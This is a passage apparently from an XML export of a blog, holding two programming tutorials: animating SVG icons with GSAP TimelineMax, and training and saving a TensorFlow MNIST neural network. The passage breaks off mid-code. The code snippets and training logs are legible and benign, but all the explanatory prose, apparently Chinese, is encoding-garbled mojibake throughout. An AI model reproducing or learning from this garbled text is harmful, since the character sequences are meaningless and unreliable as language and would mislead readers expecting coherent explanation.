    <content><![CDATA[å‰è¨€åœ¨ Codepen ä¸Šå¸¸å¸¸çœ‹åˆ°å¾ˆå¤šæœƒè¨­è¨ˆåˆæ‡‚å¯«å‰ç«¯çš„é«˜æ‰‹ï¼Œç”¨ SVG ç•«å‡ºå¾ˆæ¼‚äº®çš„åœ–æ¡ˆå¾Œï¼Œé‚„èƒ½è®“ä»–å€‘ç”¢ç”Ÿå¯æ„›çš„å‹•ç•«ï¼Œæˆ‘ä¸€ç›´å¾ˆå¥½å¥‡ä»–å€‘æ˜¯æ€éº¼å¯¦ä½œçš„ï¼Œç¸½è¦ºå¾—å¾ˆå›°é›£ï¼Œå¥½åƒå¾—å° SVG é€å¾¹äº†è§£ï¼Œä¸¦ä¸”è‡ªå·±ç•«å‡ºé‚£äº› SVG åœ–æ¡ˆï¼Œæ‰æœ‰è¾¦æ³•å¯¦ä½œå‹•ç•«ã€‚ä½†å…¶å¯¦ä¸ç„¶ï¼Œä»Šå¤©å°±ä¾†åˆ†äº«ä¸€å€‹ç°¡å–®çš„å°æŠ€å·§ï¼Œè®“ä½ åœ¨çŸ­çŸ­ååˆ†é˜å…§å°±èƒ½è®“ä¸€å€‹éœæ…‹çš„ SVG åœ–æ¡ˆæ´»èºèµ·ä¾†ï¼
ç°¡å–®çœ‹å€‹æˆå“ï¼Œä½ å¯ä»¥é»é¸ä¸‹é¢ç¯„ä¾‹ä¸­çš„ build æŒ‰éˆ•ï¼Œå¯ä»¥çœ‹åˆ°åŸæœ¬éœæ­¢çš„ SVG æˆ¿å­å‹•äº†èµ·ä¾†ï¼

  See the Pen 
  SVG Animation House by Arvin (@arvin0731)
  on CodePen.



ç¬¬ä¸€æ­¥ï¼Œå…ˆæ‰¾åˆ°ä½ å–œæ­¡çš„ SVG åœ–æ¡ˆå¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£ï¼Œç•«ä¸å‡ºæ¼‚äº®çš„åœ–æ¡ˆæˆ– Iconï¼Œå¯ä»¥åˆ° Flaticonã€Iconfinder æˆ– icons8 ç­‰ç¶²ç«™æ‰¾äº›å…è²»çš„ svg icon ä¸‹è¼‰ä½¿ç”¨ï¼ˆæ³¨æ„æˆæ¬Šå³å¯ï¼‰ã€‚

å‰é™£å­åˆ°ç¾åœ‹å‡ºå·®ç™¼ç¾ä»–å€‘å¥½åƒå¾ˆæµè¡Œæ»‘æ¿è»Šï¼ˆscooterï¼‰ï¼Œé‚£å°±åˆ° Flaticon ä¸Šæ‰¾å€‹é¡ä¼¼çš„åœ–æ¡ˆä¾†ç©ç©ï¼ï¼ˆä¸€é–‹å§‹çš„æˆ¿å±‹ç¯„ä¾‹ä¹Ÿæ˜¯å¾ Flaticon å–å¾—çš„ï¼‰ï¼š


Icons made by Freepik from www.flaticon.com

ç¬¬äºŒæ­¥ï¼Œåˆ†æä¸€ä¸‹ä½ çš„ SVG é•·ä»€éº¼æ¨£å­æ‰¾åˆ°å–œæ­¡çš„ svg icon å¾Œï¼Œç”¨ç€è¦½å™¨æ‰“é–‹ï¼Œæ¥è‘—é–‹å•Ÿ devtoolï¼Œä½ æœƒçœ‹åˆ°ä¸‹é¢çš„çµæœï¼š

è£¡é¢çš„ path è·Ÿ circle éƒ½æ˜¯ svg çš„ DOM å…ƒä»¶ï¼Œè·Ÿå­—é¢ä¸Šæ„æ€ä¸€æ¨£ï¼Œå°±æ˜¯ svg åœ–æ¡ˆå…§çš„ç·šæ¢èˆ‡åœ“å½¢ã€‚
svg çš„ pathï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸€é€£ä¸²çš„ svg mini languageï¼š
&lt;path d=&quot;M 10 25         L 10 75         L 60 75         L 10 25&quot;&gt;

ä¸Šé¢ç¨‹å¼ç¢¼ä¸­çš„ d çš„å…§å®¹ï¼šM ä»£è¡¨å°‡ ç­† ç§»å‹•åˆ° (10, 25)ï¼Œæ¥è‘— L ç•«ä¸€æ¢ç·šåˆ° (10, 75)ï¼Œä»¥æ­¤é¡æ¨ã€‚è©³ç´°ä»‹ç´¹å¯çœ‹é€™è£¡ - SVG Paths and D3.jsã€‚
é€é devtoolï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“æ¯å€‹ path æ˜¯å°æ‡‰åˆ°ç•«é¢ä¸Šçš„å“ªå€‹éƒ¨åˆ†ï¼š

åˆ°é€™é‚Šå¤§æ¦‚å°±æœƒæœ‰å€‹æ–¹å‘äº†ï¼Œæ—¢ç„¶æˆ‘å€‘å¯ä»¥çŸ¥é“æ¯å€‹å…ƒä»¶å°æ‡‰åˆ°åœ–æ¡ˆä¸Šçš„å“ªå€‹éƒ¨åˆ†ï¼Œæˆ‘å€‘å°±èƒ½å¤ é‡å°æƒ³è¦å¥—ä¸Šå‹•ç•«çš„ DOM å…ƒä»¶ä¾†æ“ä½œï¼
ç¬¬ä¸‰æ­¥ï¼Œå¥½ç”¨çš„å‹•ç•«å·¥å…· - TimelineLite &amp; TweenMaxç•¶ç„¶ä½ å¯ä»¥çµ¦äºˆæ¯å€‹ svg å…§çš„ DOM å…ƒä»¶ä¸€å€‹ç¨ç‰¹çš„ idï¼Œæˆ–æ˜¯ class nameï¼Œç„¶å¾Œç”¨ CSS æˆ– JavaScript ä¾†è‡ªè¡Œè™•ç†å‹•ç•«ï¼Œä½†é€™æ¨£é›£åº¦é‚„æ˜¯é —é«˜ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå°±æ²’è¾¦æ³•åœ¨ååˆ†é˜å…§åšå®Œ XD
æ‰€ä»¥æˆ‘å€‘å¾—å€Ÿç”¨å·¥å…·ï¼ŒTimeline(Lite|Max) è·Ÿ TweenMax æ˜¯çŸ¥åçš„ GreenSock Animation Platformï¼ˆç°¡ç¨± GSAPï¼‰æ¨å‡ºçš„å¥—ä»¶ï¼Œå¾åç¨±å°±å¯ä»¥çŒœå‡ºï¼Œä¸»è¦æ˜¯æä¾› æ™‚é–“è»¸ èˆ‡ è£œé–“ å‹•ç•«çš„ APIï¼š
&lt;!-- index.html --&gt;&lt;div class=&quot;example&quot;&gt;  &lt;div class=&quot;example__ball&quot;&gt;&lt;/div&gt;  &lt;h1 class=&quot;example__title&quot;&gt;Taiwan No.1!&lt;/h1&gt;    &lt;button onclick=&quot;animateCircle()&quot;&gt; Build! &lt;/button&gt;&lt;/div&gt;&lt;!-- JavaScript --&gt;&lt;script&gt;// ä½¿ç”¨ TimelineMax ç‰©ä»¶const tl = new TimelineMax();// åˆ©ç”¨ .set è¨­å®šæ“æœ‰ class name .example__title çš„å…ƒç´ // å°‡å…¶ scale ç¸®å°æˆ 0.2ï¼Œé€æ˜åº¦è¨­ç‚º 0tl  .set(&quot;.example__title&quot;, &#123;    scale: 0.2,    autoAlpha: 0  &#125;)  // å°‡æ“æœ‰ class name .example__ball çš„å…ƒç´   // scale ç¸®å°æˆ 0.2  .set(&quot;.example__ball&quot;, &#123;    scale: 0.2  &#125;)  // tween 1: åœ¨ 1 ç§’å…§æ—‹è½‰ 360 åº¦ï¼Œä¸¦ç¿»è½‰ 180 åº¦  // æ¥è‘—å›å¾© scale æˆåŸå§‹å¤§å°ï¼Œä¸­é–“ä»¥ Elastic.easeIn é€™å€‹ ease function ä¾†æ§åˆ¶å‹•ç•«é€Ÿåº¦  .to(&quot;.example__ball&quot;, 1, &#123;    rotationX: 360,    rotationY: 180,    scale: 1,    ease: Elastic.easeIn.config(2, 1)  &#125;)  // tween 2: è·Ÿç¬¬ä¸€å€‹è£œé–“å‹•ç•«é›·åŒï¼Œåªæ˜¯é€™æ¬¡æ˜¯æ§åˆ¶æ–‡å­—ï¼Œä¸¦åœ¨ 0.5 å…§å®Œæˆ  .to(&quot;.example__title&quot;, 0.5, &#123;    autoAlpha: 1,    scale: 1,    ease: Back.easeOut.config(4)  &#125;);&lt;/script&gt;

GSAP ç”šè‡³æä¾›ä¸€å€‹ Ease Visualizer è®“ä½ å¯ä»¥çœ‹çœ‹æ¯ç¨® Ease function çš„æ•ˆæœï¼Œæ›´é †å¸¶é™„ä¸Šç¨‹å¼ç¢¼ï¼š

ä¸Šè¿°çŸ­çŸ­çš„ç¨‹å¼ç¢¼å°±èƒ½é”åˆ°å¦‚ä¸‹æ•ˆæœï¼š

  See the Pen 
  GSAP Tutorial: Simple Timeline by Arvin (@arvin0731)
  on CodePen.



ç¬¬å››æ­¥ï¼Œçµåˆ GSAP å·¥å…·èˆ‡ä½ å–œæ„›çš„ SVGGSAP çš„ API æ–‡ä»¶è »é½Šå…¨çš„ï¼Œé‚„æœ‰è«–å£‡å¯ä»¥æœå°‹ç›¸é—œå•é¡Œï¼Œä½¿ç”¨ä¸Šæœ‰ä»»ä½•å•é¡Œå¹¾ä¹éƒ½èƒ½åœ¨ä¸Šé¢æ‰¾åˆ°ç­”æ¡ˆï¼šå®˜ç¶²æ–‡ä»¶ã€è«–å£‡
åœ¨ä¸€é–‹å§‹çš„æˆ¿å±‹ç¯„ä¾‹ä¸­ï¼Œæˆ‘ä¸»è¦ä½¿ç”¨çš„æ˜¯ TimelineMax çš„ from èˆ‡ staggerFromï¼Œè·Ÿå‰æ­¥é©Ÿå…§çš„ç¯„ä¾‹ä¸åŒï¼Œé€™å…©å€‹ API åªéœ€è¦è¨­å®šåˆå§‹å€¼ï¼Œä»–æœƒåœ¨æŒ‡å®šæ™‚é–“å…§å°‡è£œé–“å‹•ç•«å®Œæˆï¼š
tl.from(&#x27;#House &gt; rect:nth-child(24)&#x27;, 1, &#123;scaleX: 0, transformOrigin: &quot;center&quot;, ease: Power2.easeOut&#125;)

å°‡ CSS Selector #House &gt; rect:nth-child(24) é€™å€‹å…ƒç´ ï¼Œå¾ scaleX ç‚º 0 é–‹å§‹ï¼Œä»¥ center(ä¸­å¿ƒ) ç‚ºè®Šå½¢èµ·é»ï¼Œåˆ©ç”¨ Power2.easeOut çš„ ease functionï¼Œåœ¨ä¸€ç§’å…§å›å¾©åˆ°åŸå§‹ç‹€æ…‹ï¼Œä¸¦åŸ·è¡Œè£œé–“å‹•ç•«ã€‚
.staggerFrom([&#x27;#House &gt; path:nth-child(34)&#x27;, &#x27;#House &gt; path:nth-child(32)&#x27;], 0.8, &#123;scaleY: 0, transformOrigin: &quot;bottom&quot;, ease: Bounce.easeOut, stagger:0.2&#125;, 0, &quot;scene1+=0.5&quot;)

èˆ‡ from é›·åŒï¼Œåªæ˜¯ staggerFrom å¯ä»¥ä¸€æ¬¡æ”¾å…¥å¤šå€‹ CSS Selectorï¼Œç”¨ stagger é€™å€‹å±¬æ€§ä¾†è¨­å®šé™£åˆ—ä¸­çš„ Selector è¦ä»¥æ€æ¨£çš„æ™‚é–“å·®å‡ºç¾ã€‚
è©³ç´° API åƒæ•¸å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶
æ¥è‘—å›åˆ°æˆ‘å€‘çš„ SVGï¼Œåœ¨ devtool çš„å¹«åŠ©ä¸‹ï¼Œè¦å–å‡º svg å…§éƒ¨å…ƒç´ çš„ CSS Selector éå¸¸å®¹æ˜“ï¼Œåœ¨ DOM å…ƒä»¶ä¸ŠæŒ‰å³éµï¼Œé¸æ“‡ Copy -&gt; Copy selectorï¼Œå°±èƒ½ç›´æ¥è¤‡è£½åˆ°è©²å…ƒä»¶çš„ CSS Selectorï¼š

ç¾åœ¨æˆ‘å€‘èƒ½å–å¾— svg ä¸­ä»»ä½•éƒ¨åˆ†çš„ CSS Selectorï¼Œä¹ŸçŸ¥é“æˆ‘å€‘èƒ½ç”¨ GSAP API ä¾†é€²è¡Œè£œé–“å‹•ç•«ï¼Œç¾åœ¨æ˜¯æ™‚å€™å°‡å…¶çµåˆèµ·ä¾†ï¼
ç¬¬ä¸€æ­¥å…ˆèª¿æ•´ä¸€ä¸‹åŸºæœ¬ Layoutï¼Œä¸€èˆ¬åœ¨ç©ºç™½ Html å…§ç›´æ¥æ”¾å…¥ svg æ™‚ï¼Œåœ–æ¡ˆå¤§å¤šæœƒç·Šé é é¢å·¦ä¸Šè§’ï¼Œå› ç‚º svg æœ¬èº«é€šå¸¸ä¸æœƒæœ‰ä»»ä½•é—œæ–¼ layout çš„ CSSï¼Œæ‰€ä»¥å¯ä»¥å¥—ç”¨å€‹ margin: 0 auto å°‡å…¶ç½®ä¸­ï¼Œçœ‹èµ·ä¾†æœƒé †çœ¼ä¸€äº›ï¼Œä½ ä¹Ÿèƒ½é¡å¤–åŠ äº› paddingã€‚æ­¤å¤–ï¼Œç‚ºäº†æ–¹ä¾¿æ¸¬è©¦å‹•ç•«æ•ˆæœï¼Œä¹Ÿå¯ä»¥æ”¾å€‹ button åœ¨é é¢ä¸Šï¼Œç”¨ä¾†å‘¼å«ä½ çš„å‹•ç•«å‡½å¼ï¼š
&lt;!--html part--&gt;&lt;button onclick=&quot;animateBike()&quot;&gt; Build! &lt;/button&gt;&lt;!--css part--&gt;&lt;style&gt;#Capa_1 &#123;  margin: 0 auto;  display: block;  width: 256px;  height: 100%;&#125;&lt;/style&gt;

æ¥è‘—æˆ‘å€‘ä½¿ç”¨ TimelineMax æä¾›çš„ staggerFrom å‡½å¼ï¼Œåˆ©ç”¨ devtool å°‡æ»‘æ¿è»Šçš„è¼ªå­éƒ¨åˆ†æ‰¾å‡ºä¾†ï¼Œè¤‡è£½å®ƒå€‘çš„ CSS Selectorï¼Œæ”¾å…¥ staggerFrom å‡½å¼åƒæ•¸ä¸­ï¼Œè¨­å®š x èˆ‡ y è»¸çš„ scale éƒ½å¾ 0 é–‹å§‹ï¼Œç”± center å¢é•·ï¼Œæ¡ç”¨ Bounce.easeOut çš„ ease functionï¼Œè€Œå››å€‹ Selector é–“ä»¥ stagger: 0.2 çš„å±¬æ€§å€¼ä½œç‚ºè£œé–“å‹•ç•«å‡ºç¾çš„æ™‚é–“å·®ï¼š
const tl = new TimelineMax();  tl    .staggerFrom([&#x27;#Capa_1 &gt; g &gt; path:nth-child(1)&#x27;, &#x27;#Capa_1 &gt; circle:nth-child(7)&#x27;, &#x27;#Capa_1 &gt; path:nth-child(6)&#x27;, &#x27;#Capa_1 &gt; circle:nth-child(5)&#x27;],      1, &#123;scaleY:0, scaleX: 0, transformOrigin: &quot;center&quot;, ease: Bounce.easeOut, stagger:0.2&#125;)

ç°¡å–®å¹¾è¡Œç¨‹å¼ç¢¼ï¼Œå°±èƒ½è®“æˆ‘å€‘çš„æ»‘æ¿è»Šæœ‰äº†å‹•ç•«ï¼

  See the Pen 
  Scooter - demo1 by Arvin (@arvin0731)
  on CodePen.



ç¬¬äº”æ­¥ï¼Œç™¼æ®å‰µæ„ï¼Œå°‡æ•´é«”å‹•ç•«å®ŒæˆTimelineMax æ‰€æä¾›çš„ API éƒ½æ˜¯ chainable çš„ï¼Œä½ å¯ä»¥æƒ³åƒæˆæ˜¯æ™‚é–“è»¸ä¸€èˆ¬ï¼Œå‹•ç•«è·Ÿè‘— chain ä¸€æ­¥ä¸€æ­¥ç…§é †åºåŸ·è¡Œï¼Œè€Œ staggerFrom å‰‡å¯ä»¥åŒæ™‚è®“å¤šå€‹ DOM å…ƒä»¶ä»¥äº›å¾®æ™‚é–“å·®çš„é †åºå•Ÿå‹•ï¼Œå¦å¤–ä¹Ÿèƒ½è¨­ç½®ä¸€äº› Flag ä¾†æŒ‡å®šè¦ç­‰åˆ°å“ªå¹¾å€‹å‹•ç•«å®Œæˆå¾Œï¼Œæ‰æ¥çºŒå…¶ä»–å‹•ç•«ï¼Œé€™äº›ç´°ç¯€ç•¶ä½ åœ¨æ€è€ƒè¦å¦‚ä½•â€œå‹•ç•«â€ä½ çš„ SVG æ™‚ï¼Œå†å» GSAP çš„æ–‡ä»¶èˆ‡è«–å£‡æŸ¥è©¢ï¼Œç›¸ä¿¡éƒ½èƒ½æ‰¾åˆ°è§£ç­”ã€‚
æœ€å¾Œï¼Œç™¼æ®è‡ªå·±çš„å‰µæ„ï¼ŒæŠŠ svg çš„å„å€‹éƒ¨åˆ†éƒ½è£œä¸Šå‹•ç•«ï¼Œæ­é… GSAP æä¾›çš„æ–‡ä»¶ï¼Œçµ„åˆå„ç¨® APIï¼Œä¸€å€‹ç°¡å–®çš„ä½œå“å°±å®Œæˆäº†ï¼š

  See the Pen 
  Scooter - final-steps by Arvin (@arvin0731)
  on CodePen.



çµè«–é›–ç„¶é€™å€‹å°æŠ€å·§èªªç ´çœŸçš„ä¸å€¼éŒ¢ï¼Œæœ€å›°é›£çš„æŠ€è¡“éƒ½äº¤çµ¦äº† GSAP è™•ç†ï¼ŒSVG é‚„ä¸ç”¨æ˜¯è‡ªå·±ç•«çš„ï¼Œä½†åŠ åœ¨è‡ªå·±çš„éƒ¨è½æ ¼æˆ–æ˜¯æ”¾åœ¨æŠ•å½±ç‰‡ä¸­ï¼Œå¯ä»¥ç¬é–“è®“ç•«é¢æ›´åŠ è±å¯Œï¼Œç„¡èŠæ²’äº‹æ‹¿ä¾†å¨›æ¨‚è‡ªå·±ä¹Ÿæ˜¯å¾ˆä¸éŒ¯çš„é¸æ“‡ï¼Œåƒæ˜¯å‡ºåœ‹æ—…è¡Œå›ä¾†æœ‰æ™‚å·®ç¡ä¸è‘—ï¼Œä¸å¦‚å°±ä¾†ç•«å€‹å‹•ç•«èª¿é¤Šèº«å¿ƒ XDç¸½ä¹‹ï¼Œæˆ‘è‡ªå·±è¦ºå¾—è »æœ‰è¶£çš„ï¼Œå¸Œæœ›æˆ–å¤šæˆ–å°‘å°è®€åˆ°é€™ç¯‡æ–‡ç« çš„äººæœ‰é»å¹«åŠ©ã€‚
è³‡æ–™ä¾†æº
GreenSock Animation Platform
How to Create Beautiful SVG Animations Easily

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>animation</tag>
        <tag>svg</tag>
        <tag>TimelineMax</tag>
        <tag>GSAP</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ TensorFlow ä¾†åšç°¡å–®çš„æ‰‹å¯«æ•¸å­—è¾¨è­˜</title>
    <url>/2018/01/27/tensorflow-mnist/</url>
    <content><![CDATA[å‰è¨€ç›¸ä¿¡å¤§å®¶éƒ½çŸ¥é“ TensorFlow æ˜¯å¯ä»¥ç”¨ä¾†å»ºç«‹è·Ÿè¨“ç·´æ©Ÿå™¨å­¸ç¿’çš„æ¨¡å‹ï¼Œä»Šå¤©æˆ‘å€‘å°±ä¾†è·‘ä¸€å€‹æœ€ç°¡å–®çš„ Neural Networkï¼Œä¾†è¾¨è­˜æ‰‹å¯«æ•¸å­—ï¼Œè®“ä»–åå‡ºçµæœã€‚æœ‰äº†é€™å€‹ç¨‹å¼ä¹‹å¾Œï¼Œä¹‹å¾Œå°±å¯ä»¥å†éŠœæ¥å…¶ä»–çš„å·¥å…·ï¼Œä¾‹å¦‚è®“æ©Ÿå™¨äººè£ä¸€å€‹ cameraï¼Œè®€åˆ° camera çš„å½±åƒä¹‹å¾Œå¯ä»¥è¾¨è­˜æ•¸å­—ï¼Œé€™æ¨£å°±å¯ä»¥é€éæ•¸å­—ä¾†å°æ©Ÿå™¨äººä¸‹æŒ‡ä»¤ã€‚æˆ–æ˜¯å¯ä»¥å†æŠ½æ›è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ nodeï¼Œæ”¹æˆè¾¨è­˜ç‰©é«”ä¹‹é¡çš„ã€‚
æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘é–‹å§‹å§ã€‚
TensorFlow è¾¨è­˜æ‰‹å¯«æ•¸å­—é¦–å…ˆï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥åƒè€ƒç¾æˆçš„ç¨‹å¼ç¢¼ï¼Œè£¡é¢å…œå‡ºäº†ä¸€å€‹ 2 å±¤çš„ Fully Connected Neural Networkï¼ˆä¹Ÿç¨±ä½œ Multilayer Perceptronï¼‰ï¼Œè£¡é¢åŸæœ¬å°±æœ‰æ»¿æ¸…æ¥šçš„è¨»è§£ï¼Œè®“å¤§å®¶æ˜“æ–¼ç†è§£ï¼š
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot; from __future__ import print_function # Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) import tensorflow as tf # Parameterslearning_rate = 0.1num_steps = 500batch_size = 128display_step = 100 # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph input# placeX = tf.placeholder(&quot;float&quot;, [None, num_input])Y = tf.placeholder(&quot;float&quot;, [None, num_classes]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125;  # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Define loss and optimizerloss_op = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(    logits=logits, labels=Y))optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate)train_op = optimizer.minimize(loss_op) # Evaluate modelcorrect_pred = tf.equal(tf.argmax(prediction, 1), tf.argmax(Y, 1))accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32)) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # Start trainingwith tf.Session() as sess:     # Run the initializer    sess.run(init)     for step in range(1, num_steps+1):        batch_x, batch_y = mnist.train.next_batch(batch_size)        # Run optimization op (backprop)        sess.run(train_op, feed_dict=&#123;X: batch_x, Y: batch_y&#125;)        if step % display_step == 0 or step == 1:            # Calculate batch loss and accuracy            loss, acc = sess.run([loss_op, accuracy], feed_dict=&#123;X: batch_x,                                                                 Y: batch_y&#125;)            print(&quot;Step &quot; + str(step) + &quot;, Minibatch Loss= &quot; + \                  &quot;&#123;:.4f&#125;&quot;.format(loss) + &quot;, Training Accuracy= &quot; + \                  &quot;&#123;:.3f&#125;&quot;.format(acc))     print(&quot;Optimization Finished!&quot;)     # Calculate accuracy for MNIST test images    print(&quot;Testing Accuracy:&quot;, \        sess.run(accuracy, feed_dict=&#123;X: mnist.test.images,                                      Y: mnist.test.labels&#125;))

åŸ·è¡Œé€™å€‹ç¨‹å¼ä¹‹å¾Œï¼Œä½ æ‡‰è©²æœƒçœ‹åˆ°ä»¥ä¸‹çš„çµæœï¼Œè¡¨ç¤ºåŠŸèƒ½æ­£å¸¸ï¼Œå¯ä»¥æ‹¿ä¾†è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ datasetï¼š
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn.py Successfully downloaded train-images-idx3-ubyte.gz 9912422 bytes.Extracting /tmp/data/train-images-idx3-ubyte.gzSuccessfully downloaded train-labels-idx1-ubyte.gz 28881 bytes.Extracting /tmp/data/train-labels-idx1-ubyte.gzSuccessfully downloaded t10k-images-idx3-ubyte.gz 1648877 bytes.Extracting /tmp/data/t10k-images-idx3-ubyte.gzSuccessfully downloaded t10k-labels-idx1-ubyte.gz 4542 bytes.Extracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 13:10:45.868367: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAStep 1, Minibatch Loss= 12711.9502, Training Accuracy= 0.305Step 100, Minibatch Loss= 473.9966, Training Accuracy= 0.852Step 200, Minibatch Loss= 67.3683, Training Accuracy= 0.938Step 300, Minibatch Loss= 102.2178, Training Accuracy= 0.883Step 400, Minibatch Loss= 43.7579, Training Accuracy= 0.914Step 500, Minibatch Loss= 49.5792, Training Accuracy= 0.820Optimization Finished!Testing Accuracy: 0.8672

ä½†æ˜¯ï¼Œä¸Šé¢é€™å€‹ç¯„ä¾‹è·‘èµ·ä¾†æœ‰é»ç©ºè™›ï¼Œå› ç‚ºåªæ˜¯è·‘äº†ä¸€å€‹ datasetï¼Œä½†æˆ‘å€‘æ˜¯å¸Œæœ›ç”¨ä¾†è¾¨è­˜ä¸€å¼µåœ–ç‰‡ã€‚
å„²å­˜å¯ä»¥è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ Modelé›–ç„¶è¦è¨“ç·´é€™å€‹ç¯„ä¾‹å¾ˆç°¡å–®ï¼Œä½†æˆ‘å€‘ä¸å¸Œæœ›æ¯æ¬¡å•Ÿå‹•ç¨‹å¼æ™‚éƒ½é‡æ–°è¨“ç·´ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘å€‘å¸Œæœ›å¯ä»¥å°‡è¨“ç·´å®Œçš„ model å„²å­˜ä¸‹ä¾†ï¼Œæˆ‘å€‘ä¸»è¦å¯ä»¥åƒè€ƒé€™å€‹ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œç„¶å¾ŒæŠŠå„²å­˜ model éœ€è¦ç”¨åˆ°çš„å¹¾å€‹å‡½å¼æ”¾åˆ°æˆ‘å€‘ä¸Šé¢çš„ç¯„ä¾‹ä¸­ï¼š
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot; from __future__ import print_function # Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) import tensorflow as tf # Parameterslearning_rate = 0.1num_steps = 500batch_size = 128display_step = 100model_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input])Y = tf.placeholder(&quot;float&quot;, [None, num_classes]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125;  # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Define loss and optimizerloss_op = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(    logits=logits, labels=Y))optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate)train_op = optimizer.minimize(loss_op) # Evaluate modelcorrect_pred = tf.equal(tf.argmax(prediction, 1), tf.argmax(Y, 1))accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32)) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Start trainingwith tf.Session() as sess:     # Run the initializer    sess.run(init)     for step in range(1, num_steps+1):        batch_x, batch_y = mnist.train.next_batch(batch_size)        # Run optimization op (backprop)        sess.run(train_op, feed_dict=&#123;X: batch_x, Y: batch_y&#125;)        if step % display_step == 0 or step == 1:            # Calculate batch loss and accuracy            loss, acc = sess.run([loss_op, accuracy], feed_dict=&#123;X: batch_x,                                                                  Y: batch_y&#125;)            print(&quot;Step &quot; + str(step) + &quot;, Minibatch Loss= &quot; + \                  &quot;&#123;:.4f&#125;&quot;.format(loss) + &quot;, Training Accuracy= &quot; + \                  &quot;&#123;:.3f&#125;&quot;.format(acc))     print(&quot;Optimization Finished!&quot;)     # Save model weights to disk    save_path = 